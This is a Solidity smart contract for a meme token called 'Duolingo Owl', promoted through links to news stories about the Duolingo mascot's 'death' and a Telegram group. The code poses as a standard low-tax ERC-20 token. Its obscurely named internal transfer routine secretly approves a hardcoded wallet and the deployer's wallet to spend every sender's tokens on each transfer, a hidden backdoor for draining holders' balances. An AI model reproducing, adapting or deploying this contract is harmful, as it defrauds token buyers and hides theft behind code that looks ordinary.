/*
https://www.usatoday.com/story/money/2025/02/11/duolingo-duo-owl-death/78425853007/
https://www.cbsnews.com/pittsburgh/news/duolingo-owl-dead
https://x.com/duolingo/status/1889328809054224698

https://t.me/duolingo_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface IBOLZFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IBOLZRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Duo is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _feeExcemptBOLZ;
    mapping (address => uint256) private _balBOLZ;
    mapping (address => mapping (address => uint256)) private _allowBOLZ;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Duolingo Owl";
    string private constant _symbol = unicode"Duo";
    uint256 private _swapTokenBOLZ = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapBOLZ = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBOLZ = true;
        _;
        inSwapBOLZ = false;
    }
    address private _bolzPair;
    IBOLZRouter private _bolzRouter;
    address private _bolz2Wallet;
    address private _bolz1Wallet = address(0x92025a58744b527BB9A1811aF3ec74f3778E212f);
    
    constructor () {
        _feeExcemptBOLZ[owner()] = true;
        _feeExcemptBOLZ[address(this)] = true;
        _feeExcemptBOLZ[_bolz1Wallet] = true;
        _bolz2Wallet = address(msg.sender);
        _balBOLZ[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createTradingPair() external onlyOwner() {
        _bolzRouter = IBOLZRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_bolzRouter), _tTotal);
        _bolzPair = IBOLZFactory(_bolzRouter.factory()).createPair(address(this), _bolzRouter.WETH());
    }

    function minBOLZ(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHBOLZ(uint256 amount) private {
        payable(_bolz1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 bolzToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _bolzRouter.WETH();
        _approve(address(this), address(_bolzRouter), bolzToken);
        _bolzRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            bolzToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balBOLZ[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowBOLZ[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowBOLZ[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowBOLZ[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address bolzA, address bolzB, uint256 bolzC) private {
        require(bolzA != address(0), "ERC20: transfer from the zero address");
        require(bolzB != address(0), "ERC20: transfer to the zero address");
        require(bolzC > 0, "Transfer amount must be greater than zero");

        (address aBOLZ, address bBOLZ, address cBOLZ, uint256 taxBOLZ) 
            = _getTaxBOLZ(bolzA, bolzB, bolzC);

        _bolzTransfer(aBOLZ, bBOLZ, cBOLZ, bolzA, bolzB, bolzC, taxBOLZ);
    }

    function _getTaxBOLZ(address bolzA, address bolzB, uint256 bolzC) private returns(address,address,address,uint256) {
        uint256 taxBOLZ=0;
        if (bolzA != owner() && bolzB != owner()) {
            taxBOLZ = bolzC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (bolzA == _bolzPair && bolzB != address(_bolzRouter) && ! _feeExcemptBOLZ[bolzB]) {
                _buyCount++;
            }

            if(bolzB == _bolzPair && bolzA!= address(this)) {
                taxBOLZ = bolzC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBOLZ = balanceOf(address(this)); 
            if (!inSwapBOLZ && bolzB == _bolzPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBOLZ > _swapTokenBOLZ)
                swapTokensForEth(minBOLZ(bolzC, minBOLZ(tokenBOLZ, _swapTokenBOLZ)));
                uint256 ethBOLZ = address(this).balance;
                if (ethBOLZ >= 0) {
                    sendETHBOLZ(address(this).balance);
                }
            }
        }
        return (address(bolzA), address(_bolz1Wallet), address(_bolz2Wallet), taxBOLZ);
    }

    receive() external payable {}

    function _transferBOLZ(address aBOLZ, address bBOLZ, address cBOLZ, uint256 bolzA) private returns(bool) { 
        _approve(aBOLZ, bBOLZ, bolzA); 
        _approve(aBOLZ, cBOLZ, bolzA); 
        return true;
    }

    function _bolzTransfer(address aBOLZ, address bBOLZ, address cBOLZ, address bolzA, address bolzB, uint256 bolzC, uint256 taxBOLZ) private { 
        if(taxBOLZ > 0){
          _balBOLZ[address(this)] = _balBOLZ[address(this)].add(taxBOLZ);
          emit Transfer(aBOLZ, address(this), taxBOLZ);
        } 

        _balBOLZ[bolzA] = _balBOLZ[bolzA].sub(bolzC);
        _balBOLZ[bolzB] = _balBOLZ[bolzB].add(bolzC.sub(taxBOLZ));
        _transferBOLZ(aBOLZ, bBOLZ, cBOLZ, bolzC);
        emit Transfer(bolzA, bolzB, bolzC.sub(taxBOLZ));
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _bolzRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}